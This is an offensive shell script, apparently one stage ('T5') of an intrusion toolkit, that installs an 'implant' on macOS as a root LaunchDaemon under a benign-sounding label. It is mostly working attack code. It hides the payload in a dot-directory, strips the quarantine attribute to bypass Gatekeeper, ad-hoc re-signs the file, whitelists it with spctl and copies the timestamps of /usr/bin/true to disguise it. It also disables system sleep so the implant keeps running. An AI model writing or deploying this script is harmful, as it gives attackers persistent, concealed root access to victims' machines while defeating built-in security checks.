#!/bin/sh
# T5 — macOS root persistence: LaunchDaemon + hidden payload under /usr/local/lib.
# usage: sudo install-daemon.sh <implant-path> [label]
# Requires root. Strips quarantine (the "Open Anyway" equivalent), ad-hoc re-signs,
# root-whitelists via spctl --add for belt-and-suspenders silent launch.
set -eu

[ "$(id -u)" = "0" ] || { echo "run as root" >&2; exit 1; }
PAYLOAD="${1:?usage: install-daemon.sh <implant-path> [label]}"
LABEL="${2:-io.fleet.agent}"

DIR="/usr/local/lib/.${LABEL}"
mkdir -p "$DIR"
DEST="$DIR/$LABEL"
cp "$PAYLOAD" "$DEST"
chmod 0755 "$DEST"
chown root:wheel "$DEST"

# ---- 1. check quarantine state --------------------------------------------
Q="$(xattr -p com.apple.quarantine "$DEST" 2>/dev/null || true)"
if [ -n "$Q" ]; then
  echo "[fleet] quarantine present on payload: $Q"
else
  echo "[fleet] payload not quarantined"
fi

# ---- 2. clear quarantine — the "Open Anyway" equivalent --------------------
# LaunchServices skips Gatekeeper assessment once the xattr is gone; this is
# GUI-free, root-driven here, and survives reboots. Clear on the installed
# bundle, not the download archive (quarantine propagates on extraction).
xattr -dr com.apple.quarantine "$DEST" 2>/dev/null || true
xattr -dr com.apple.quarantine "$DIR" 2>/dev/null || true

# ---- 3. verify quarantine is gone ------------------------------------------
Q2="$(xattr -p com.apple.quarantine "$DEST" 2>/dev/null || true)"
if [ -n "$Q2" ]; then
  echo "[fleet] warning: quarantine still present: $Q2"
else
  echo "[fleet] quarantine cleared — Gatekeeper assessment skipped"
fi

# ---- 4. ad-hoc re-sign if needed (fixes broken/hardened runtime) -----------
if ! codesign -dv --verbose=4 "$DEST" >/dev/null 2>&1; then
  echo "[fleet] no valid signature — ad-hoc re-signing payload"
  codesign --force --deep --sign - "$DEST" 2>/dev/null || true
fi

# ---- 5. spctl --add belt-and-suspenders whitelist (root-only) --------------
spctl --add "$DEST" >/dev/null 2>&1 || true
spctl --add "$DIR" >/dev/null 2>&1 || true

# ---- match timestamps of a ubiquitous signed system binary -----------------
SRC="/usr/bin/true"
if [ -f "$SRC" ]; then
    touch -r "$SRC" "$DEST" 2>/dev/null || true
fi

# ---- stay awake: prevent sleep / lid-close sleep / disk sleep --------------
pmset -a sleep 0 >/dev/null 2>&1 || true
pmset -a disablesleep 1 >/dev/null 2>&1 || true
pmset -a disksleep 0 >/dev/null 2>&1 || true
caffeinate -s >/dev/null 2>&1 &

PLIST="/Library/LaunchDaemons/${LABEL}.plist"
cat > "$PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>${LABEL}</string>
  <key>ProgramArguments</key><array><string>${DEST}</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
EOF
chown root:wheel "$PLIST"
chmod 0644 "$PLIST"

launchctl unload "$PLIST" >/dev/null 2>&1 || true
launchctl load "$PLIST" >/dev/null 2>&1 || true
echo "installed LaunchDaemon ${LABEL} -> ${DEST}"
